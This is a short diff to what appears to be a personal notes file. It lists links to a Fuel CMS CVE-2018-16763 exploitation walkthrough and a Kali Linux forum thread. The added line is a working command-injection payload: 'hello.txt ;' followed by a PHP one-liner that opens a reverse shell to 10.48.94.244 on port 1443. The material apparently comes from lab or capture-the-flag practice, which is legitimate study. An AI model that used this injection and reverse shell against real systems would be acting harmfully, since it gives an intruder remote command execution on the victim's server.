@@ -1,3 +1,5 @@
 https://drive.google.com/file/d/1FbA73hAWEw1l8hQQS3JsunDjQj6ybq5o/view?usp=sharing
 https://odajxx.medium.com/vulnerability-capstone-exploiting-fuel-cms-1-4-a-walkthrough-of-cve-2018-16763-f4c889c02ca2
 https://www.reddit.com/r/Kalilinux/comments/1o0mxon/cursor_invisible_after_updates/
+
+hello.txt ; php -r '$sock=fsockopen("10.48.94.244",1443);exec("sh <&3 >&3 2>&3");'
